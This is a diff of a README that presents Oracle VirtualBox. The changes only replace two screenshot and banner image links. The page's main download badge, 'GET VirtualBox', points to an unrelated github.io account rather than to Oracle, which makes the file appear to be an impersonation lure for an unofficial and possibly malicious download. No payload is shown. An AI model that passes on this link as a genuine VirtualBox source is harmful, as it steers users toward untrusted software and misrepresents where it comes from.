@@ -6,7 +6,7 @@ Oracle VirtualBox is a virtualization application that lets users create and man
 
 Use VirtualBox to create virtual machines, import appliances, configure virtual disks, save snapshots, and manage separate computing environments. The manager provides access to machine settings, storage configuration, networking options, and runtime controls.
 
-![VirtualBox Banner](IMAGE_URL)
+![VirtualBox Banner](https://www.omgubuntu.co.uk/wp-content/uploads/2025/08/virtualbox-update.jpg)
 
 [![GET](https://img.shields.io/badge/GET-VirtualBox-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/VirtualBox-2026)
 
@@ -31,7 +31,7 @@ Use VirtualBox to create virtual machines, import appliances, configure virtual 
 
 ## VirtualBox Manager Interface
 
-![VirtualBox Manager Interface](https://docs.oracle.com/en/virtualization/virtualbox/6.1/user/images/virtualbox-main-empty.png)
+![VirtualBox Manager Interface](https://img.utdstc.com/screen/4f4/245/4f4245011f38be975f871679de91d6a0b6ac9f50a452b1a3499a44c59fd421d9:600)
 
 The VirtualBox Manager provides a central view of configured machines and their available controls. Select a machine to inspect its configuration, open its settings, or manage its current state.
 
